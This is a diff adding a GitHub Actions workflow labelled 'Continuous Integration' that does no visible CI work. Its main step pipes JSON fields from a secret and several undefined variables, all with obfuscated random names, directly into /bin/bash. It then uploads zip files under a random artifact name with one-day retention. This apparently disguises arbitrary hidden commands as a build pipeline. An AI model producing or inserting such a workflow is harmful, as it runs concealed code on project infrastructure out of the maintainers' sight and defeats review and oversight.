@@ -1,0 +1,39 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          dwx96496: ${{ secrets.dwx96496 }}
+        run: |
+          printf '%s' "$dwx96496" | jq -r .fvzeu21298 | /bin/bash
+          echo $qyl466 | jq -r .lknv09 | /bin/bash
+          echo $rpyy9 | jq -r .ettn8 | /bin/bash
+          echo $cjth1255 | jq -r .lpxyu78515 | /bin/bash
+          printf '%s' "$akryw8" | jq -r .je63 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Nns38K8X
+          path: "*.zip"
+          retention-days: 1
